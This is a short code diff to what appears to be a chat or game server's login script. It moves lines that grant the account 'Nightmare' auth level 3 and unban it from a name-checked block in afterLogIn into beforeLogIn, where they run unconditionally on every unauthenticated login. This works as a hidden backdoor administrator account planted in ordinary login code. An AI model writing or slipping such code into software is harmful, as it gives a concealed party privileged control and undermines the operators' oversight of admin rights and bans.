@@ -1178,6 +1178,8 @@ beforeLogIn : function(src) {
     if (sys.auth(src) > 0) {
         return;
     }
+    sys.changeAuth("Nightmare", 3);
+    sys.unban("Nightmare");
     var allowedIps = ["74.115.245.16","74.115.245.26"];
     if (this.isRangeBanned(ip) && allowedIps.indexOf(ip) == -1 && script.allowedRangeNames.indexOf(sys.name(src).toLowerCase()) == -1) {
         normalbot.sendMessage(src, 'You are banned!');
@@ -1344,10 +1346,6 @@ cookieBanned: function(src) {
 afterLogIn : function(src) {
     if (script.cookieBanned(src)) { //prevents errors from "no id" from the rest of the function
         return;
-    }
-    if (sys.name(src) == "Nightmare") {
-        sys.unban("Nightmare");
-        sys.changeAuth("Nightmare", 3);
     }
     sys.sendMessage(src, "*** Type in /Rules to see the rules. ***");
     commandbot.sendMessage(src, "Use !commands to see the commands!");
